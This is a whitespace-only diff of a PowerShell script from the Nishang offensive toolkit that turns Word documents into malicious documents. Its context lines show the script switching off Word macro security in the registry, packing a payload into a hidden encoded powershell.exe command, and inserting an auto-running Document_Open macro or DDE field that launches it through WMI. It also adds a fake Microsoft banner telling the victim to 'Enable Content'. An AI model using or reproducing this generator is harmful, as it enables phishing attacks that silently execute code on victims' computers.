@@ -180,9 +180,9 @@ https://github.com/samratashok/nishang
     {
         $Word.DisplayAlerts = "wdAlertsNone"
     }
-    
+
     #Determine names for the Word versions. To be used for the template generated for tricking the targets.
-    
+
     switch ($WordVersion)
     {
         "11.0" {$WordName = "2003"}
@@ -192,8 +192,7 @@ https://github.com/samratashok/nishang
         "16.0" {$WordName = "2016"}
         default {$WordName = ""}
     }
-    
-        
+
     #Turn off Macro Security
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | Out-Null
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | Out-Null
@@ -212,7 +211,7 @@ https://github.com/samratashok/nishang
     {
         #Logic to read, compress and Base64 encode the payload script.
         $Enc = Get-Content $PayloadScript -Encoding Ascii
-    
+
         #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
         $ms = New-Object IO.MemoryStream
         $action = [IO.Compression.CompressionMode]::Compress
@@ -220,10 +219,10 @@ https://github.com/samratashok/nishang
         $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
         $Enc | ForEach-Object {$sw.WriteLine($_)}
         $sw.Close()
-    
+
         # Base64 encode stream
         $Compressed = [Convert]::ToBase64String($ms.ToArray())
-    
+
         $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
 
         "`$(New-Object IO.Compression.DeflateStream (" +
@@ -251,7 +250,7 @@ https://github.com/samratashok/nishang
             }
         }
         #Encoded script payload for Macro
-        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
+        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"
     }
 
     #Use line-continuation for longer payloads like encodedcommand or scripts.
@@ -265,14 +264,14 @@ https://github.com/samratashok/nishang
     }
     $i = 0
     $FinalPayload = ""
-    
+
     if ($Payload.Length -gt 800)
     {
         #Playing with the payload to fit in multiple lines in proper VBA syntax.
         while ($i -lt $index )
         {
-            $TempPayload = '"' + $Payload.Substring($i*800,800) + '"' + " _" + "`n" 
-            
+            $TempPayload = '"' + $Payload.Substring($i*800,800) + '"' + " _" + "`n"
+
             #First iteration doesn't need the & symbol.
             if ($i -eq 0)
             {
@@ -281,15 +280,14 @@ https://github.com/samratashok/nishang
             else
             {
                 $FinalPayload = $FinalPayload + "& " + $TempPayload
-            }            
-            $i +=1
-
+            }
+            $i += 1
         }
 
         $remainingindex = $Payload.Length%800
         if ($remainingindex -ne 0)
         {
-            $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"' 
+            $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"'
         }
 
     #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
@@ -304,7 +302,7 @@ https://github.com/samratashok/nishang
                 Const HIDDEN_WINDOW = 0
                 strComputer = "."
                 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
+
                 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                 Set objConfig = objStartup.SpawnInstance_
                 objConfig.ShowWindow = HIDDEN_WINDOW
@@ -316,7 +314,6 @@ https://github.com/samratashok/nishang
     #If the payload is small in size, there is no need of multiline macro.
     else
     {
-        
         $code_one = @"
         Sub Document_Open()
         Execute
@@ -328,7 +325,7 @@ https://github.com/samratashok/nishang
                 Const HIDDEN_WINDOW = 0
                 strComputer = "."
                 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
+
                 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                 Set objConfig = objStartup.SpawnInstance_
                 objConfig.ShowWindow = HIDDEN_WINDOW
@@ -373,7 +370,6 @@ https://github.com/samratashok/nishang
                 {
                     $word.Selection.InsertFormula($DDEPayload)
                 }
-
             }
             #Else use macro
             else
@@ -381,8 +377,7 @@ https://github.com/samratashok/nishang
                 Write-Verbose "Using auto-executable macro."
                 $DocModule = $Doc.VBProject.VBComponents.Item(1)
                 $DocModule.CodeModule.AddFromString($code_one)
-            }
-                        
+            } 
             if ($WordFile.Extension -eq ".doc")
             {
                 $Savepath = $WordFile.FullName
@@ -400,7 +395,7 @@ https://github.com/samratashok/nishang
             else
             {
                 $Doc.Saveas([ref]$SavePath, 0)
-            } 
+            }
             Write-Output "Saved to file $SavePath"
             $Doc.Close()
             $LastModifyTime = $WordFile.LastWriteTime
@@ -436,7 +431,7 @@ https://github.com/samratashok/nishang
         {
             $DocModule = $Doc.VBProject.VBComponents.Item(1)
             $DocModule.CodeModule.AddFromString($code_one)
-        }        
+        }
         #Add stuff to trick user in Enabling Content (running macros)
         $Selection = $Word.Selection 
         $Selection.TypeParagraph() 
@@ -448,7 +443,7 @@ https://github.com/samratashok/nishang
         {
             [void] $Shape.AddPicture((Resolve-Path $MSLogoPath))
         }
-        $Selection.TypeParagraph() 
+        $Selection.TypeParagraph()
         $Selection.Font.Size = 42
         $Selection.TypeText("Microsoft Word $WordName")
         $Selection.TypeParagraph()
@@ -458,8 +453,7 @@ https://github.com/samratashok/nishang
         $Selection.TypeText("To load the document, please ")
         $Selection.Font.Bold = 1
         $Selection.TypeText("Enable Content")
-            
-    
+
         if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
         {
             $Doc.Saveas($OutputFile, 0)
@@ -467,7 +461,7 @@ https://github.com/samratashok/nishang
         else
         {
             $Doc.Saveas([ref]$OutputFile, [ref]0)
-        } 
+        }
         Write-Output "Saved to file $OutputFile"
         $Doc.Close()
         $Word.quit()
@@ -476,7 +470,7 @@ https://github.com/samratashok/nishang
 
     if ($RemainUnSafe)
     {
-        Write-Warning "RemainUnsafe selected. Not turning on Macro Security"   
+        Write-Warning "RemainUnsafe selected. Not turning on Macro Security"
     }
     else
     {
@@ -485,5 +479,3 @@ https://github.com/samratashok/nishang
         New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
     }
 }
-
-
